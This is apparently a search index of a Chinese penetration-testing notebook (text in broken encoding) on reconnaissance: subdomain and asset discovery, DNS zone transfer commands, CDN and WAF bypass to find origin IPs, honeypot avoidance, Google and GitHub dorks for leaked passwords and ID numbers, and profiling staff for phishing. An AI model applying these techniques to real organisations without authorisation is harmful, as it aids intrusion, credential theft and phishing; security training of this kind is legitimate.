{"./":{"url":"./","title":"Introduction","keywords":"","body":"Introduction Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-11 22:54:33 "},"01.æ¸—é€æµ‹è¯•/01.ä¿¡æ¯æ”¶é›†/01.èµ„äº§æ”¶é›†.html":{"url":"01.æ¸—é€æµ‹è¯•/01.ä¿¡æ¯æ”¶é›†/01.èµ„äº§æ”¶é›†.html","title":"01.èµ„äº§æ”¶é›†","keywords":"","body":"ä¸ºä»€ä¹ˆ å°½å¯èƒ½çš„æ‰©å¤§æ”»å‡»é¢ ä¸»åŸŸåæ”¶é›† ICPå¤‡æ¡ˆæŸ¥è¯¢ æ˜¯ä»€ä¹ˆ ICPå¤‡æ¡ˆæ˜¯æŒ‡ç½‘ç«™åœ¨ä¿¡æ¯äº§ä¸šéƒ¨æäº¤ç½‘ç«™ä¿¡æ¯è¿›è¡Œå®˜æ–¹è®¤å¯ã€‚ æ‰€ä»¥å›½å†…ä½¿ç”¨å›½å†…æœåŠ¡å™¨çš„ç½‘ç«™ï¼Œéƒ½å¿…é¡»è¦å…ˆåŠç†ICPå¤‡æ¡ˆåæ‰å¯ä»¥ä¸Šçº¿ã€‚ æœ‰ä»€ä¹ˆç”¨ é€šè¿‡æŸ¥è¯¢ç›®æ ‡ä¼ä¸šçš„å¤‡æ¡ˆä¿¡æ¯ï¼Œå¯ç›´æ¥è·å–åˆ°ç›®æ ‡ä¼ä¸šæ³¨å†Œäº†å“ªäº›åŸŸåï¼Œä»è€Œå¢åŠ å¯æ¸—é€çš„ç›®æ ‡èŒƒå›´ã€‚ WhoIs æ˜¯ä»€ä¹ˆ WHOISæ˜¯ç”¨æ¥æŸ¥è¯¢äº’è”ç½‘ä¸­åŸŸåçš„IPä»¥åŠæ‰€æœ‰è€…ç­‰ä¿¡æ¯çš„ä¼ è¾“åè®®ã€‚ æœ‰ä»€ä¹ˆç”¨ é€šè¿‡æŸ¥è¯¢ç›®æ ‡çš„WHOISä¿¡æ¯ï¼Œå¯ä»¥å¯¹è”ç³»äººã€è”ç³»é‚®ç®±ç­‰ä¿¡æ¯è¿›è¡ŒåæŸ¥ï¼Œå¯ä»¥è·å–æ›´å¤šç›¸å…³çš„åŸŸåä¿¡æ¯ã€‚ è‚¡æƒä¿¡æ¯ é€šè¿‡æŸ¥è¯¢è‚¡æƒä¿¡æ¯ï¼Œæˆ–è€…è‚¡æƒç©¿é€å›¾ï¼Œå¯»æ‰¾å­å…¬å¸å’Œå­™å…¬å¸ç­‰ï¼Œä¸€èˆ¬å¯¹å¤–æŠ•èµ„è¶…è¿‡50%æˆ–è€…æœ‰è¡Œæ”¿æƒé™çš„éƒ½å¯ä»¥ç®—ç›®æ ‡ DNSå…±äº«è®°å½•æŸ¥è¯¢ åŸç† æŸ¥è¯¢å…±äº«DNSæœåŠ¡å™¨çš„ä¸»æœºæ¥è·å–åˆ°ç›¸å…³çš„åŸŸå æ­¥éª¤ é¦–å…ˆæŸ¥è¯¢ç›®æ ‡æ˜¯å¦å­˜åœ¨è‡ªå»ºçš„NSæœåŠ¡å™¨ nslookup -query=ns baidu.com å°†éæƒå¨åº”ç­”ä¸­çš„nsæœåŠ¡å™¨å¸¦åˆ°ä¸‹é¢çš„ç½‘ç«™æŸ¥è¯¢ Find all Hosts pointing to DNS Server å­åŸŸåæ”¶é›† å­åŸŸåçˆ†ç ´ åŸç† é€šè¿‡ä¸æ–­çš„æ‹¼æ¥å­—å…¸ä¸­çš„å­åŸŸåå‰ç¼€å»æšä¸¾åŸŸåçš„Aè®°å½•ï¼Œå†å¯¹å…¶è¿›è¡ŒéªŒè¯ï¼Œä½†æ˜¯è¯¥æ–¹æ³•ä¸€èˆ¬éœ€è¦è§£å†³æ³›è§£æé—®é¢˜ã€‚ æ³›è§£æ Aè®°å½•ï¼š*.khaz.top â†’ 1.1.1.1 ï¼ˆè¿™æ ·xxx.khaz.topåŸŸååœ¨è¿›è¡Œdnsè§£ææ—¶éƒ½ä¼šæŒ‡å‘1.1.1.1ï¼‰ å¦‚ä½•è§£å†³æ³›è§£æï¼š # é»‘åå•IPæ³• é€šè¿‡è·å–ä¸€ä¸ªä¸å­˜åœ¨çš„å­åŸŸåç›¸åº”è§£æIPï¼Œæ¥è®°å½•æ ‡è®°é»‘åå•ipï¼Œå†çˆ†ç ´å­—å…¸æ—¶ï¼Œè§£æåˆ°çš„IPåœ¨è¿™ä¸ªé»‘åå•ipä¸­ï¼Œåˆ™è·³è¿‡ï¼Œä¸å­˜åœ¨å°±ç»§ç»­å¤„ç†ã€‚ # TTL åœ¨æƒå¨ DNS ä¸­ï¼Œæ³›è§£æè®°å½•çš„ TTL è‚¯å®šæ˜¯ç›¸åŒçš„ï¼Œå¦‚æœå­åŸŸåè®°å½•ç›¸åŒï¼Œä½† TTL ä¸åŒï¼Œé‚£è¿™æ¡è®°å½•å¯ä»¥è¯´è‚¯å®šä¸æ˜¯æ³›è§£æè®°å½•ã€‚ ä»¥oneforallä¸ºä¾‹ï¼š oneforallä¼šé¦–å…ˆè®¿é—®ä¸€ä¸ªéšæœºçš„å¹¶ä¸å­˜åœ¨çš„åŸŸï¼Œé€šè¿‡è¿”å›ç»“æœåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³›è§£æï¼Œç¡®å®šå­˜åœ¨æ³›è§£æä»¥åï¼Œç¨‹åºä¼šå¼€å§‹ä¸æ–­çš„å¾ªç¯äº§ç”ŸéšæœºåŸŸåï¼Œå»å‘æœåŠ¡å™¨æŸ¥è¯¢ï¼Œå°†æ¯æ¬¡æŸ¥è¯¢åˆ°çš„IPå’ŒTTLè®°å½•ä¸‹æ¥ï¼Œç›´åˆ°å¤§éƒ¨åˆ†çš„IPåœ°å€å‡ºç°æ¬¡æ•°éƒ½å¤§äºä¸¤æ¬¡ï¼Œåˆ™IPé»‘åå•çš„æ”¶é›†ç»“æŸï¼Œåœ¨å¾—åˆ°äº†IPé»‘åå•ä»¥åï¼Œoneforallæ¥ä¸‹æ¥ä¼šå°†è‡ªå·±çš„å­—å…¸ä¸­çš„æ¯ä¸€é¡¹å’Œè¦æŒ‡å®šæŸ¥è¯¢çš„åŸŸåè¿›è¡Œæ‹¼æ¥ã€‚åœ¨çˆ†ç ´è¿‡ç¨‹ä¸­æ ¹æ®IPé»‘åå•è¿›è¡Œè¿‡æ»¤ã€‚ä½†è¿™ç§å®½æ³›çš„è¿‡æ»¤å®¹æ˜“å¯¼è‡´æ¼æŠ¥ï¼Œæ‰€ä»¥oneforallå°† TTL ä¹Ÿä½œä¸ºé»‘åå•è§„åˆ™çš„ä¸€éƒ¨åˆ†ï¼Œè¯„åˆ¤çš„ä¾æ®æ˜¯ï¼šåœ¨æƒå¨ DNS ä¸­ï¼Œæ³›è§£æè®°å½•çš„ TTL è‚¯å®šæ˜¯ç›¸åŒçš„ï¼Œå¦‚æœå­åŸŸåè®°å½•ç›¸åŒï¼Œä½† TTL ä¸åŒï¼Œé‚£è¿™æ¡è®°å½•å¯ä»¥è¯´è‚¯å®šä¸æ˜¯æ³›è§£æè®°å½•ã€‚ è¯ä¹¦é€æ˜åº¦ æ˜¯ä»€ä¹ˆ è¯ä¹¦é€æ˜æ€§ï¼ˆCertificate Transparencyï¼ŒCTï¼‰æ˜¯ Google çš„å…¬å¼€é¡¹ç›®ï¼Œé€šè¿‡è®©åŸŸæ‰€æœ‰è€…ã€CA å’ŒåŸŸç”¨æˆ·å¯¹ SSL è¯ä¹¦çš„å‘è¡Œå’Œå­˜åœ¨è¿›è¡Œå®¡æŸ¥ï¼Œæ¥çº æ­£è¿™äº›åŸºäºè¯ä¹¦çš„å¨èƒã€‚ æœ‰ä»€ä¹ˆç”¨ å› ä¸ºæ˜¯å…¬å¼€çš„ï¼Œæ‰€ä»¥ä»»ä½•äººéƒ½å¯ä»¥è®¿é—®åˆ°å…¶ä¸­çš„CA è¯ä¹¦ï¼ŒåŒ…å«äº†åŸŸåã€å­åŸŸåã€é‚®ç®±ç­‰æ•æ„Ÿä¿¡æ¯ã€‚ åœ¨çº¿æŸ¥è¯¢ crt.sh | Certificate Search Censys Search DNSå…¬å¼€æ•°æ®é›† åˆ©ç”¨å·²æœ‰å…¬å¼€çš„æ‰«ææ•°æ®é›†ï¼Œå¯¹å­åŸŸåä¿¡æ¯è¿›è¡Œæ”¶é›†ã€‚ https://opendata.rapid7.com/ DNS åŸŸä¼ é€ æ˜¯ä»€ä¹ˆ DNSæœåŠ¡å™¨åˆ†ä¸ºä¸»æœåŠ¡å™¨ï¼Œå¤‡ä»½æœåŠ¡å™¨ï¼Œç¼“å­˜æœåŠ¡å™¨ã€‚ åŸŸä¼ é€æ˜¯æŒ‡å¤‡ä»½æœåŠ¡å™¨ä»ä¸»æœåŠ¡å™¨ä¸Šå¤åˆ¶æ•°æ®ï¼Œç„¶åæ›´æ–°è‡ªèº«çš„æ•°æ®åº“ï¼Œä»¥è¾¾åˆ°æ•°æ®åŒæ­¥çš„ç›®çš„ï¼Œè¿™æ ·æ˜¯ä¸ºäº†å¢åŠ å†—ä½™ï¼Œä¸€æ—¦ä¸»æœåŠ¡å™¨å‡ºç°é—®é¢˜å¯ç›´æ¥è®©å¤‡ä»½æœåŠ¡å™¨åšå¥½æ”¯æ’‘å·¥ä½œã€‚ æœ‰ä»€ä¹ˆç”¨ è‹¥ DNS æœåŠ¡å™¨é…ç½®ä¸å½“ï¼Œå¯èƒ½å¯¼è‡´æ”»å‡»è€…è·å–æŸä¸ªåŸŸçš„æ‰€æœ‰è®°å½•ã€‚é€ æˆæ•´ä¸ªç½‘ç»œçš„æ‹“æ‰‘ç»“æ„æ³„éœ²ç»™æ½œåœ¨çš„æ”»å‡»è€…ã€‚ æ£€æµ‹æ–¹æ³• digè¯·æ±‚ # æ‰¾åˆ°NSæœåŠ¡å™¨ dig [domain] ns # å‘é€axfrè¯·æ±‚ dig axfr @[ns] [domain] nmapè„šæœ¬ --script dns-zone-transfer --script-args dns-zone-transfer.domain=[domain] æœç´¢å¼•æ“ ä¼ ç»Ÿæœç´¢å¼•æ“ site: xxx.com -xxx (-xxx æ’é™¤å“ªäº›å­åŸŸ) ç½‘ç»œç©ºé—´æµ‹ç»˜ ç«™ç‚¹çˆ¬è™« é€šè¿‡çˆ¬å–ç½‘ç«™ä¸­çš„urlé“¾æ¥æ¥å‘ç°æ–°çš„å­åŸŸåï¼Œé€šè¿‡Burpæ’ä»¶è¢«åŠ¨æ”¶é›† ç«™ç‚¹ä¿¡æ¯æ³„æ¼ crossdomain.xml sitemap.xml å“åº”åŒ…ä¸­çš„CSPå…¶ä¸­*-srcå¯èƒ½ä¼šå­˜åœ¨åŸŸåä¿¡æ¯ ç¬¬ä¸‰æ–¹åœ¨çº¿å¹³å° https://securitytrails.comï¼ˆUIå¥½çœ‹ï¼Œç»“æœæœ€å¤šï¼‰ DNSdumpster.com https://rapiddns.io/ ä¾›åº”é“¾å•ä½ èŒƒå›´ å¼€å‘å•†ã€å¤–åŒ…å•†ã€è¿ç»´å•†ã€ç¡¬ä»¶æä¾›å•† è·å–é€”å¾„ é¡µé¢ç‰ˆæƒæ‰€æœ‰ï¼Œè°å¼€å‘çš„ å¯¹å®˜ç½‘ç­‰ç‰¹å®šç³»ç»Ÿé€šè¿‡é¦–é¡µæˆ–ç›®å½•æ‰«æçš„å¤‡ä»½æ–‡ä»¶æˆ–æ¨¡æ¿é¡µé¢æºä»£ç ä¸­æŸ¥æ‰¾ä¾›åº”å•† æœç´¢å¼•æ“æœç´¢ç‰¹å®šç³»ç»Ÿåç§°-æ‹›æ ‡å…¬å‘Š-åº”æ ‡å•ä½ æ”»å‡»æ–¹å¼ ä¾›åº”å•†ç¤ºä¾‹ç³»ç»Ÿçš„é»˜è®¤è´¦å· ä¾›åº”å•†ç¤ºä¾‹ç³»ç»Ÿæˆ–è¯¥ç³»ç»Ÿçš„å…¶ä»–ä½¿ç”¨å•ä½è¿›è¡Œæ¼æ´å°è¯• å¦‚ç›®æ ‡ç³»ç»Ÿä¸å¼€æ”¾æ³¨å†Œä½†ç¤ºä¾‹å’Œå…¶ä»–å…¬ç½‘ç³»ç»Ÿå¼€æ”¾æ³¨å†ŒåŠŸèƒ½ï¼Œå³å¯ä»å‰å°è½¬ä¸ºåå°è¿›è¡Œé»‘ç›’æµ‹è¯• é€šè¿‡å„ç§é€”å¾„è·å–æºç åè¿›è¡Œä»£ç å®¡è®¡ æ”¶é›†å®¢æœä¿¡æ¯ï¼ˆäººå‘˜ä¿¡æ¯ã€å®‰å…¨æ„è¯†ã€æµè§ˆå™¨ç‰ˆæœ¬ã€officeç‰ˆæœ¬ï¼‰ã€ITç®¡ç†å‘˜ä¿¡æ¯è¿›è¡Œé’“é±¼ è¡Œä¸šä¿¡æ¯å…³é”®å­— é€šè¿‡ç›¸å…³å…³é”®å­—è¿›è¡Œæ£€ç´¢å‘ç°èµ„äº§ æ°”è±¡å±€ ç³»ç»Ÿå…³é”®è¯ æ±¡æŸ“ æ’æ±¡ ç©ºæ°”è´¨é‡ åƒåœ¾ç„šçƒ§ ç¯è¯„ è¾å°„ ç›‘æµ‹ ç›‘æ§ ç¯å¢ƒ è‡ªç„¶ ç”Ÿæ€ åºŸç‰© è´¨é‡ æ•™è‚²-æ•™è‚²å… é€šè¿‡æ•™è‚²å…å®˜ç½‘æœºæ„è®¾ç½®ã€ç›´å±å•ä½è·å–ç»„ç»‡ç»“æ„ æœç´¢å¼•æ“ siteï¼šxxx ç›´å±å•ä½ siteï¼šxxx æœºæ„è®¾ç½® æ•™è‚²è€ƒè¯•é™¢ï¼ˆæ‹›ç”Ÿè€ƒè¯•é™¢ï¼‰ç›´å±äºæ•™è‚²å… æ•™è‚²-å­¦æ ¡ ç»„ç»‡æ¶æ„ å­¦æ ¡åä¸‹å…¬å¸ å‡ºç‰ˆç¤¾ åŸºé‡‘ä¼š æ ¡å‹ä¼š ç½‘ç»œç©ºé—´æœç´¢å¼•æ“ titleã€body domain cert icon å¿«é€Ÿçªç ´å£ï¼švpnã€ssoï¼Œåœ¨ä¿¡æ¯åŒ–é—¨æˆ·æœé›†ç™»å½•è§„åˆ™ googleè¯­æ³• site:xxx.com \"èº«ä»½è¯å·/å­¦å·/å·¥å·/vpn\" (filetypeï¼šxls/doc) GitHub \"xxx.edu.cn\" \"username/password/vpn\" åŒ»ç–—-å«å¥å§” æå–å…³é”®å­— æœºæ„-å†…è®¾æœºæ„ å§”é¢†å¯¼-åˆ†ç®¡å·¥ä½œ å«å¥å§”å‰èº«å«è®¡å§”ã€å«ç”Ÿéƒ¨/å«ç”Ÿå…/å«ç”Ÿå±€ å¦‡å¹¼ä¿å¥é™¢éš¶å±äºäºå«å¥å§” å…³é”®å­—ï¼šå«ç”Ÿå¥åº·å§”ã€å«ç”Ÿå¥åº·ã€å«è®¡å§”ã€å«ç”Ÿå’Œè®¡åˆ’ç”Ÿè‚²å§”å‘˜ä¼š é‡‘è-é“¶è¡Œ é‡‘èå®˜ç½‘ä¸€èˆ¬æ˜¯ä¸šåŠ¡ï¼Œç»„ç»‡æ¶æ„å‚è€ƒæ¯å¹´ç¤¾ä¼šè´£ä»»æŠ¥å‘Šã€å¹´æŠ¥ã€å…³äºæˆ‘ä»¬-ä¿¡æ¯æŠ«éœ²ä¸­å­˜ åœ¨ç»„ç»‡æ¶æ„ ç½‘ç»œç©ºé—´æœç´¢å¼•æ“ domain certï¼š cert=\"China Merchants Bank\"/\"XX é“¶è¡Œ\"/\"xxx.com\"/\"xxx\" icon Webçªç ´ç‚¹ å¾®ä¿¡å…¬ä¼—å·ã€å°ç¨‹åº ç§»åŠ¨ç«¯APP æœªå¼€æ”¾ç³»ç»Ÿæˆ–æµ‹è¯•ç³»ç»Ÿ googleè¯­æ³• site:xxx.com \"èº«ä»½è¯å·\"/\"å·¥å·\"/\"vpn\" (filetypeï¼šxls/doc) site:xxx.com inurl:login/inurl:upload githubè¯­æ³• \"xxx.edu.cn\" \"username/password/vpn\" é‚®ç®±æŸ¥æ‰¾å¯é€šè¿‡å¤©çœ¼æŸ¥ï¼ˆæ”¶è´¹ï¼‰ æ”¿åŠ¡-æ”¿åŠ¡äº‘ å¯èƒ½çš„çªç ´ç‚¹ å¸‚åœºç›‘ç£ç®¡ç†å±€-ç‰¹ç§è®¾å¤‡ç®¡ç† æµªæ½®äº‘è¡¨å• é›†çº¦åŒ– é‡è¦æ™¯åŒºï¼ˆå¯èƒ½ï¼‰ å¹¿ç”µå±€ã€å¹¿æ’­ç”µè§†å±€ è·Ÿå¹¿æ’­ç”µè§†å°ä¸åŒï¼Œè¡Œæ”¿å•ä½å’Œäº‹ä¸šå•ä½çš„åŒºåˆ« å…¶ä»–åº”ç”¨ä¸­çš„åŸŸå/IP å¾®ä¿¡/æ”¯ä»˜å®å°ç¨‹åº å¾®ä¿¡å…¬ä¼—å· æ‰‹æœºAPPï¼šæŠ“åŒ…ï¼Œå†å²ç‰ˆæœ¬ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-29 19:13:39 "},"01.æ¸—é€æµ‹è¯•/01.ä¿¡æ¯æ”¶é›†/02.æŒ‡çº¹è¯†åˆ«.html":{"url":"01.æ¸—é€æµ‹è¯•/01.ä¿¡æ¯æ”¶é›†/02.æŒ‡çº¹è¯†åˆ«.html","title":"02.æŒ‡çº¹è¯†åˆ«","keywords":"","body":"ä¸ºä»€ä¹ˆ æ ¹æ®å¯¹åº”çš„æŒ‡çº¹è¿›è¡Œç‰¹å®šæ”»å‡» å‰ç«¯ï¼šJS,WebPack åç«¯ï¼šåç«¯è¯­è¨€ç¼ºé™· ç»„ä»¶ï¼šæ¡†æ¶ï¼Œä¸­é—´ä»¶æ¼æ´ ç«¯å£æœåŠ¡ï¼šç‰¹å®šåè®®ï¼Œåº”ç”¨æ”»å‡» è¯†åˆ«å®‰å…¨è®¾å¤‡ æŒ‡çº¹è¯†åˆ«åŸç† TideFinger/WebæŒ‡çº¹è¯†åˆ«æŠ€æœ¯ç ”ç©¶ä¸ä¼˜åŒ–å®ç°.md at master Â· TideSec/TideFinger ä¸»åŠ¨è¯†åˆ«ï¼šç‰¹å®šæ–‡ä»¶çš„MD5ï¼Œç‰¹å®šè·¯å¾„ è¢«åŠ¨è¯†åˆ«ï¼šå…³é”®å­—åŒ¹é… æ‰‹å·¥åˆ¤æ–­æŒ‡çº¹ å‰ç«¯jsä»£ç ï¼Œæ–‡ä»¶åï¼Œè·¯å¾„ç­‰æ”¾åˆ°githubï¼Œgiteeæœ iconä¿¡æ¯ç­‰æ”¾åˆ°ç©ºé—´æœç´¢å¼•æ“ ç‰ˆæƒæ ‡è¯†å¦‚urlï¼Œlogoç­‰ï¼ˆå¯èƒ½æ³¨é‡Šæˆ–è€…åˆ é™¤äº†ï¼‰ ä»URIä¸­å‘ç° CDN FromBYPASS-CDN/CDN 2023 å®Œå…¨æ”»å‡»æŒ‡å—ï¼ˆä¸€ï¼‰.md at main Â· bin-maker/BYPASS-CDN Â· GitHub æ˜¯ä»€ä¹ˆ CDNï¼ˆContent Delivery Networkï¼‰ï¼Œä¸­æ–‡å…¨ç§°ä¸ºå†…å®¹åˆ†å‘ç½‘ç»œã€‚ ç®€å•çš„è¯´å°±æ˜¯ä¸€ç»„åœ¨ä¸åŒè¿è¥å•†ä¹‹é—´çš„å¯¹æ¥ç‚¹ä¸Šçš„é«˜é€Ÿç¼“å­˜æœåŠ¡å™¨ï¼ŒæŠŠç”¨æˆ·ç»å¸¸è®¿é—®çš„é™æ€æ•°æ®èµ„æºç›´æ¥ç¼“å­˜åˆ°èŠ‚ç‚¹æœåŠ¡å™¨ä¸Šï¼Œå½“ç”¨æˆ·å†æ¬¡è¯·æ±‚æ—¶ï¼Œä¼šç›´æ¥åˆ†å‘åˆ°ç¦»ç”¨æˆ·è¿‘çš„èŠ‚ç‚¹æœåŠ¡å™¨ä¸Šå“åº”ç»™ç”¨æˆ·ï¼Œå½“ç”¨æˆ·æœ‰å®é™…æ•°æ®äº¤äº’æ—¶æ‰ä¼šä»è¿œç¨‹WebæœåŠ¡å™¨ä¸Šå“åº”ï¼Œè¿™æ ·å¯ä»¥å¤§å¤§æé«˜ç½‘ç«™çš„å“åº”é€Ÿåº¦åŠç”¨æˆ·ä½“éªŒã€‚ è¿™é‡ŒCDNèŠ‚ç‚¹å°±å……å½“äº†åå‘ä»£ç†çš„ä½œç”¨ ä¸ºä»€ä¹ˆè¦ç»•è¿‡ å¯»æ‰¾çœŸå®IPï¼Œè¿™æ ·æ‰å¯ä»¥è¿›è¡Œç«¯å£æ‰«æ ç»•è¿‡äº‘Waf åˆ¤æ–­CDN è§‚å¯Ÿè¯·æ±‚å“åº”çš„è¿”å›æ•°æ®çš„å¤´éƒ¨ï¼Œæ˜¯å¦æœ‰ CDN æœåŠ¡å•†æ ‡è¯† é€šè¿‡ä¸åŒå®šä½åœ°ç‚¹çš„ ping æµ‹è¯•ï¼Œå¦‚æœæ²¡æœ‰ä½¿ç”¨CDNï¼Œåˆ™åªä¼šæ˜¾ç¤ºä¸€ä¸ªIPåœ°å€ http://www.webkaka.com/Ping.aspx ï¼ˆå›½å†…+å›½å¤–ï¼‰ https://www.host-tracker.com/v3/check/ ï¼ˆå›½å¤–ï¼‰ åˆ¤æ–­ IP æ˜¯å¦åœ¨å¸¸è§ CDN æœåŠ¡å•†çš„æœåŠ¡å™¨ IP æ®µä¸Š è‹¥ asp æˆ–è€… asp.net ç½‘ç«™è¿”å›å¤´çš„ server ä¸æ˜¯ IISã€è€Œæ˜¯ Nginxï¼Œåˆ™å¤šåŠä½¿ç”¨äº†nginxåå‘ä»£ç†åˆ° CDN åˆ©ç”¨ Nslookup æŸ¥è¯¢åŸŸå æœåŠ¡å™¨åç§° åŒä¸€ä¸ªåŸŸåè§£æå¯¹åº”å¤šä¸ª IP åœ°å€ CDNç»•è¿‡æ–¹æ³• CDNè´¹ç”¨é—®é¢˜ CDN åŠ é€Ÿéœ€è¦æ”¯ä»˜ä¸€å®šçš„è´¹ç”¨ï¼Œæ‰€ä»¥å­ç«™ï¼Œå›½å¤–å¾ˆå¯èƒ½æ²¡æœ‰éƒ¨ç½²CDNã€‚ å†å² DNS è®°å½• IP History - ViewDNS.info å¾®æ­¥åœ¨çº¿Xæƒ…æŠ¥ç¤¾åŒº-å¨èƒæƒ…æŠ¥æŸ¥è¯¢å¨èƒåˆ†æå¹³å°å¼€æ”¾ç¤¾åŒº é‚®ç®±æ³• è®©ç›®æ ‡é‚®ä»¶æœåŠ¡å™¨å‘é€é‚®ä»¶ç»™æˆ‘ä»¬çš„é‚®ç®±ï¼Œé€šè¿‡æŸ¥çœ‹æ”¶åˆ°çš„é‚®ä»¶æºç åœ¨ä¸€å®šæƒ…å†µä¸‹å¯ä»¥æ‰¾åˆ°çœŸå®IPï¼ˆå¯ä»¥çœ‹åˆ°å¯¹æ–¹ä½¿ç”¨çš„é‚®ä»¶æœåŠ¡å™¨IPï¼‰ ä½¿ç”¨ç›®æ ‡ç½‘ç«™çš„é‚®ä»¶å‘é€åŠŸèƒ½ï¼Œå°†é‚®ä»¶å‘é€ç»™ä¸€ä¸ªä¸å­˜åœ¨çš„é‚®ç®±åœ°å€ï¼Œå› ä¸ºæ‰¾ä¸åˆ°é‚®ç®±åœ°å€æ‰€ä»¥å‘é€å¿…ç„¶æ˜¯å¤±è´¥çš„ï¼Œè¿™é‡Œé‚®ä»¶æœåŠ¡å™¨å¯èƒ½ä¼šè¿”å›ä¸€ä¸ªé”™è¯¯æ¶ˆæ¯é€šçŸ¥ï¼Œåœ¨è¿™ä¸ªæ¶ˆæ¯é€šçŸ¥ä¸­å°±åŒ…å«äº†è¯¥é‚®ä»¶æœåŠ¡å™¨çš„çœŸå®IP å¸¸è§åœºæ™¯ RSS è®¢é˜… é‚®ç®±æ³¨å†Œã€æ¿€æ´»å¤„ é‚®ç®±æ‰¾å›å¯†ç å¤„ äº§å“æ›´æ–°çš„é‚®ä»¶æ¨é€ æŸä¸šåŠ¡æ‰§è¡Œåå‘é€çš„é‚®ä»¶é€šçŸ¥ å‘˜å·¥é‚®ç®±ã€é‚®ä»¶ç®¡ç†å¹³å°ç­‰å…¥å£å¤„çš„å¿˜è®°å¯†ç  ç©ºé—´æµ‹ç»˜å¼•æ“ favicon.ico å“ˆå¸Œç‰¹å¾ ç½‘é¡µæºç ç‰¹å¾å€¼ åœ¨æœåŠ¡å™¨æº IP åœ°å€å…è®¸è®¿é—®å¹¶ä¸”è¿”å›çš„ä¹Ÿæ˜¯ç±»ä¼¼çš„ç½‘ç«™å†…å®¹æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡ä¾¦å¯Ÿé¡µé¢æºç ä¸­ JS ã€CSS ã€HTML ç­‰ä¸€ç³»åˆ—é™æ€ç‰¹å¾å€¼ï¼Œç„¶åç”¨ Shodan ã€Zoomeye ã€Censys ç­‰æœç´¢å¼•æ“è¿›è¡ŒåŒ¹é…æœç´¢ï¼Œä»è€Œå®šä½ IP ã€‚ çœŸå® IP ä½¿ç”¨ åœ¨è·å–åˆ°çœŸå®IPåï¼Œé€šè¿‡ç›´æ¥è®¿é—®IPå¯èƒ½æ— æ³•è®¿é—® ä¿®æ”¹ hosts æ–‡ä»¶ burpsuite æµ‹è¯• WAFåˆ¤æ–­ æŸ¥çœ‹è¿”å›åŒ…æœ‰æ— WAFå­—æ · WAFW00F æŸ¥çœ‹æ‹¦æˆªé¡µé¢ä¿¡æ¯ é€šè¿‡ä¸€äº›æ˜æ˜¾çš„æ³¨å…¥æ¥è§¦å‘waf 83ä¸ªWafæ‹¦æˆªé¡µé¢-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ ï¼ˆ5å¹´å‰ï¼‰ 30å‡ æ¬¾å¸¸è§WAFçš„æ‹¦æˆªé¡µæ•´ç† ï¼ˆ2021å¹´ï¼‰ èœœç½ç›¸å…³ https://github.com/cnrstar/anti-honeypot https://send-safe-honeypot-hunter.apponic.com/ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-29 19:02:38 "},"01.æ¸—é€æµ‹è¯•/01.ä¿¡æ¯æ”¶é›†/03.æ•æ„Ÿä¿¡æ¯æ”¶é›†.html":{"url":"01.æ¸—é€æµ‹è¯•/01.ä¿¡æ¯æ”¶é›†/03.æ•æ„Ÿä¿¡æ¯æ”¶é›†.html","title":"03.æ•æ„Ÿä¿¡æ¯æ”¶é›†","keywords":"","body":"å†…éƒ¨æ³„éœ²æ–‡ä»¶ ç½‘ç›˜æœç´¢ ç§å­æœç´¢ wiki/æ–‡åº“/çŸ¥è¯†åº“æœç´¢ QQç¾¤ã€å¾®ä¿¡ç¾¤ã€ä¼ä¸šå¾®ä¿¡ç¾¤ã€é’‰é’‰ç¾¤ã€é£ä¹¦ç¾¤ç¾¤æ–‡ä»¶ å†å²ä¿¡æ¯æ³„éœ² å†å²æ¼æ´ï¼Œå†å²æ¼æ´æŠ¥å‘Š å†å²ç½‘é¡µè¢«waybackmachineæŠ“å– å†å²ç½‘é¡µå¿«ç…§è¢«æœç´¢å¼•æ“ç¼“å­˜ ç¤¾å·¥åº“ä¿¡æ¯æ³„éœ² ä»£ç æ‰˜ç®¡å¹³å° github å·¥å…· https://github.com/damit5/gitdorks_go ä½¿ç”¨ ./gitdorks_go_amd_linux -gd Dorks/smalldorks.txt -nws 20 -target gm7.org -tf tokenFile/tf.txt -ew 3 ./tokenFile/tf.txt â†’ Github access token ../Dorks/smalldorks.txt â†’ å…³é”®å­—å­—å…¸ GitLab: https://about.gitlab.com/ gitee: https://gitee.com/ ç¤¾å·¥ä¿¡æ¯æ”¶é›† äººå‘˜åŸºæœ¬ä¿¡æ¯ èº«ä»½ä¿¡æ¯ï¼ˆå§“åã€æ€§åˆ«ã€å¤§æ¦‚å¹´é¾„ï¼‰ å•ä½èŒä½ æ—¥å¸¸å·¥ä½œ å²—ä½å¯¹å¤–è”ç³»çš„ä¸»è¦å†…å®¹ å²—ä½å¯¹å†…è”ç³»çš„ä¸»è¦å†…å®¹ æ˜¯å¦æŒæ¡è®¡ç®—æœºåŸºç¡€ ç³»ç»Ÿç‰ˆæœ¬ï¼ˆWindowsã€Macçš„å¸¸ç”¨ç‰ˆæœ¬ï¼‰ è½¯ä»¶å®‰å…¨æƒ…å†µï¼ˆå®‰å…¨æ„è¯†ã€æµè§ˆå™¨ç‰ˆæœ¬ã€officeç‰ˆæœ¬ï¼‰ å•ä½åŸºæœ¬ä¿¡æ¯ å†…éƒ¨å‘˜å·¥çš„äº’ç›¸ç§°å‘¼ è€å¸ˆã€åŒå­¦ã€å“¥ã€å¸ˆå‚… å·¥ä½œæµ æ²Ÿé€šè½¯ä»¶ã€æ²Ÿé€šæ–¹å¼ï¼Œé‚®ä»¶ã€OAã€å¾®ä¿¡ã€ä¼ä¸šå¾®ä¿¡ã€é’‰é’‰ã€QQç­‰ è¿ç»´ç­–ç•¥ ä¼ä¸šæ€è½¯æœ‰æ— å’Œå…¶ç±»å‹ å®‰å…¨äººå‘˜ç´ è´¨ã€æ˜¯å¦å‡ºç½‘ã€æ˜¯å¦å…è®¸å®‰è£…è½¯ä»¶ åŠå…¬æ–¹å¼ï¼ˆå¹³å°ï¼šPCã€äº‘æ¡Œé¢ã€æ ‡è£…æœºï¼‰ ä¸»åŠ¨ç±» ç›®å½•/æ–‡ä»¶æ‰«æ å…³äºç›®å½• 